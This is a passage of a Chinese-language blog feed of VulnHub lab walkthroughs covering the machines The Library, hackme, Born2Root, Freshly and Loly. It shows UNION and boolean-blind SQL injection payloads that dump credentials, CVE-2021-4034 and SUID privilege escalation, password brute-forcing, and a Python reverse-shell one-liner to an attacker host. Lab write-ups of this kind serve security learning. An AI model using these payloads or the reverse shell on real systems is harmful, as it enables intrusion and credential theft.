&lt;p&gt;再看看日志：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEb1b6c2a118d1760aded5c8f0bc256e1b%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;那么有没有可能我传的东西会在日志里面，但是很遗憾，我上传的东西并不在，但是发现有其他东西：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE195726d9a2c0c7cbf28c87d33f6c8714%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;呐就有思路了，上传文件，等反弹shell:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE70d07aa093b3be950a373c83cb1df2f9%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;CVE-2021-4034秒了&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE6dc33c940cf5873ebf35289ea88b9797%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;SUID也可以：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE8e32c8235ef5206f6fe940d18e18537f%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x044 The Library</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x044-the-library/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x044-the-library/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE9c8d1650c99445ba77eee28ab1e630d7%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE433b5413969bf70ace6a7cf4db8f7bb9%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEf4a0837874780ad099a5c1f6841754bd%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;无匿名登录：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEbdb2ca5cd78a55cb2b03a798a3e4cf0c%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后看了一下80端口，这里有个坑点，也是没有发现sql注入的原因：&lt;/p&gt;
&lt;p&gt;这里的payload是：{&amp;ldquo;lastviewed&amp;rdquo;==&amp;ldquo;Netherlands&amp;rdquo;}&lt;/p&gt;
&lt;p&gt;得改成&amp;quot;{&amp;ldquo;lastviewed&amp;rdquo;==&amp;quot;&amp;lsquo;Netherlands&amp;rsquo;&amp;quot;}“才能正常执行功能&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc9831f543ab8228a06efac4a00d350b9image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE62cff9ecb3c3f46cc68c730e86b322d3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;后续就是手动注入：&lt;/p&gt;
&lt;p&gt;查看版本&lt;/p&gt;
&lt;p&gt;&amp;ldquo;{&amp;ldquo;lastviewed&amp;rdquo;==&amp;quot;&amp;lsquo;Netherlands&amp;rsquo;union select version();#&amp;rdquo;}&amp;quot;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE9a363c8b7c0edf8bab6fb1b034aa90f0image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;判断回显：&amp;quot;{&amp;ldquo;lastviewed&amp;rdquo;==&amp;quot;&amp;lsquo;Nethe11rlands&amp;rsquo;union select 1;#&amp;quot;}&amp;quot;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE74d76e2f3253fe7c6299e9f63735810aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&amp;ldquo;{&amp;ldquo;lastviewed&amp;rdquo;==&amp;quot;&amp;lsquo;Nethe11rlands&amp;rsquo;union select group_concat(database()) ;#&amp;rdquo;}&amp;quot;&lt;/p&gt;
&lt;p&gt;查询到当前数据库为library:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEf67775b0021f27fa6c9d96f7f8f41d10image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&amp;ldquo;{&amp;ldquo;lastviewed&amp;rdquo;==&amp;quot;&amp;lsquo;Nethe11rlands&amp;rsquo;union select group_concat(table_name) from information_schema.tables where table_schema=&amp;lsquo;library&amp;rsquo;#&amp;rdquo;}&amp;quot;&lt;/p&gt;
&lt;p&gt;查询到当前数据库下有两个表：access,countries&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEe41ee384393586dada13e2660dcae22aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;查看access表里面的列名：&lt;/p&gt;
&lt;p&gt;&amp;ldquo;{&amp;ldquo;lastviewed&amp;rdquo;==&amp;quot;&amp;lsquo;Nethe11rlands&amp;rsquo;union select group_concat(column_name) from information_schema.columns where table_name=&amp;lsquo;access&amp;rsquo; #&amp;rdquo;}&amp;quot;&lt;/p&gt;
&lt;p&gt;id,service,username,password&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEedf2be4d328bd9071e1e1f0acdcbe9e5image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;查询账号密码：&lt;/p&gt;
&lt;p&gt;&amp;ldquo;{&amp;ldquo;lastviewed&amp;rdquo;==&amp;quot;&amp;lsquo;Nethe11rlands&amp;rsquo;union select group_concat(&amp;rsquo;\n&amp;rsquo;,id,&amp;rsquo;\n&amp;rsquo;,service,&amp;rsquo;\n&amp;rsquo;,username,&amp;rsquo;\n&amp;rsquo;,password) from access #&amp;rdquo;}&amp;quot;&lt;/p&gt;
&lt;p&gt;1&lt;/p&gt;
&lt;p&gt;ftp&lt;/p&gt;
&lt;p&gt;globus&lt;/p&gt;
&lt;p&gt;AroundTheWorld&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEb4d0b61ff88eb911a1153974da677af0image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x045 hackme</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x045-hackme/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x045-hackme/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd1cbf554d8355862b3021bb89beeff36image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEfbe85a19601dd4ab45658e125c479a22image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE2ca59bd6ad66b614526f86153da62412image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;注册一个账号：&lt;/p&gt;
&lt;p&gt;登录：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEf01c1126efd226c4623af26d1209548eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这里说来惭愧，又是因为懒病，放弃了手动注入，：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE131691fd40e674bf20ece71bbd03e30aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;破解superadmin的密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE951d4c0e6f55607b087e322c763d127aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE07a00374def5f424c41f7d538c337b09image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;登录superadmin，发现上传框：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE793b853904c8b04c69af14eeab91e1e9image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE02474309031324a3ef3009fd3751ae87image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd021cc4c7bd9b7caef5258b5637652a2image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;2021-4034&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd376626b8072310083501b60ebbcddf3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;SUID&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEa8c319e467a607c10f3e5cbe807c550bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;补一下手动注入：&lt;/p&gt;
&lt;p&gt;Security &amp;rsquo; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&amp;ldquo;webapphacking&amp;rdquo;#&lt;/p&gt;
&lt;p&gt;表名：webapphacking&lt;/p&gt;
&lt;p&gt;books,users&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE4b8aadd8c45cb8915003cc95318e9b9eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;列名：&lt;/p&gt;
&lt;p&gt;Security &amp;rsquo; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&amp;lsquo;users&amp;rsquo;#&lt;/p&gt;
&lt;p&gt;USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,user,pasword,name,address&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEa276bc3a5cc899df9c190b484f6fdedcimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;Security &amp;rsquo; union select 1,2,group_concat(USER,&amp;rsquo;\n&amp;rsquo;,pasword) from users#&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE4effe1089c2998f430edd3c5d62346f6image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x046 Born2Root</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x046-born2root/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x046-born2root/</guid>
      <description>&lt;p&gt;还是向virtualbox妥协了，这次这个问题出现在导入的地方，不是很好解决&lt;/p&gt;
&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5df578715597c3b49f4243d472dcbbc3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc09a104349dea9c2b05f1e7c2aa9cc16image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE85c695b652a1e26fe7e61944e338dbe5image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEf4c5bbbe1a9792b52962a819a7b4cc04image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE0ed3c7892f2075a49877697a30ee67edimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现有效信息：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE791506b014227d0912174c412d54b9bbimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEae0a0635ac2108b46d4ef9863d41e88dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是不知道用户名，只能把首页上的用户名都试试了：&lt;/p&gt;
&lt;p&gt;出现一个提示不支持的签名，这个之前遇到过，需要改一下配置文件：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEdf3314cbc19624c5b2a130d6a462eae8image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;好像登录上去了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE1b65f822c742c7e7f7868a350631fab3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;这次提权有点意思，很多命令被禁用了，只手动挨个找，总于在查找计划任务时找到线索：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEac6037d08b857388dd6d8efbd7ed288aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;先提权到jimmy用户吧：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;192.168.5.104&amp;#34;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/bash&amp;#34;,&amp;#34;-i&amp;#34;]);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEe212692feb11cec236b7b3330307807bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现SUID权限程序：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE94e264ca953699e363b42570e8725b55image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是使用了绝对路径，相关文件没有权限：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEb2f5d8b89510e579bc0e9344a36bd0faimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;后面无奈看了WP，结果还是爆破，当初直接爆破会不会更好呢，不同的是，这次cewl的密码本不太够了。实测john生成的不太好用，规则太死了：&lt;/p&gt;
&lt;p&gt;需要生成特定的社工字典：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.bugku.com/mima/&#34;&gt;https://www.bugku.com/mima/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEfcff4143ec5542e6d7d585d15b533b43image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后爆破成功：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc7c9bf37e31fa4bd34ce742a8c2776c1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这也是root密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE94a07ea7c2aea512e552e831322422e5image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x047 Freshly</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x047-freshly/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x047-freshly/</guid>
      <description>&lt;p&gt;这台也是用virtualbox打开的&lt;/p&gt;
&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEddd932a1de8a3abffb95ac78f639055cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE455c2009ebbeffef0badbc63c9e411beimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEb5a225c51f1475c5571571ef168b0a0eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;挨个端口来看吧：&lt;/p&gt;
&lt;p&gt;首先是80：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEaf2dc3f875e6e0852684635749191dedimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEe9d96b041bbbd8fa1adecf204148e71bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE426dfb4b221c8e7b5c4e260fb022913bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;疑似线索：&lt;/p&gt;
&lt;p&gt;tumblr_mdeo27ZZjB1r6pf3eo1_500.gif&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE85c909c522338f864d15ae38a341ae82image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;login.php存在sql注入，但是这种登录框一般是盲注，这里是布尔盲注，手动可能有点麻烦：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE9b8cdf0b7df9ffa9511a62a4c8558651image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;443：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEa69a016e339c23c326b63476710628faimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现wordpress了，先搞wordpress：&lt;/p&gt;
&lt;p&gt;插件：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE24a07bb38b6177f4fe49dab52897ee52image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;用户：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE8d0f76c1ef4f65a026bd8ebfed16a635image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;通过插件查找漏洞，找到两个可能的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEa8cb12327af8643e93b29ea6926053c1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE37012679a35cd23b7d013b952dd2e1afimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;8080端口：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE72cdc318574904d05094929963e64f8bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc8526fe0902d1c5354cb480e2e84757bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEcc07cb0b3e0f442396c7e0ae50303ae0image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;只有80端口可以，看样子得写脚本了：&lt;/p&gt;
&lt;p&gt;写了半天，发现没有burp好使：&lt;/p&gt;
&lt;h1 id=&#34;测数据库长度&#34;&gt;测数据库长度：&lt;/h1&gt;
&lt;p&gt;payload:&lt;/p&gt;
&lt;p&gt;admin &amp;lsquo;or length(database())=5#&lt;/p&gt;
&lt;p&gt;数据库长度为5&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE9451203a7dfb7dc8998c34dbad310911image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE2b1000252161856330d936f4f255af90image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;测试数据库名login&#34;&gt;测试数据库名：LOGIN&lt;/h1&gt;
&lt;p&gt;substr(database(),1,1)=‘a’&lt;/p&gt;
&lt;p&gt;第一个字符：L&lt;/p&gt;
&lt;p&gt;admin &amp;lsquo;or substr(database(),1,1)=&amp;lsquo;L&amp;rsquo;#&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE9813f255e2682c0eded417d6e2a253f1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;burp操作如下：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEcc860519618c0c130e98d2759b9f8dfaimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE07604d6e128d798f6982a360439ec7b3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x048 Loly</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x048-loly/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x048-loly/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEde1e61c7e57f09e815a0032c0fd11d67image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE7b53bb254eede2f1784e84384fdf8712image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc324ca6592b23308ee422700e12de567image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEa9e28aad8a73bd4a43a09e041ad35a13image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;改一下hosts文件：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE221fda2b20a603f6d2d3ba7f4c22d8acimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;wpscan扫描&lt;/p&gt;
&lt;p&gt;插件&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEaa966ed8ab637209797eb0e8ee19f739image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;用户&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE8dcf8b474e296f3bc5948b612fdcac19image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;直接使用rockyou爆破得到密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5de246a980baef1a1b26d104c7d5f97dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;Username: loly, Password: fernando&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE8d9b91ad2b3508092f2ad26524fea912image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
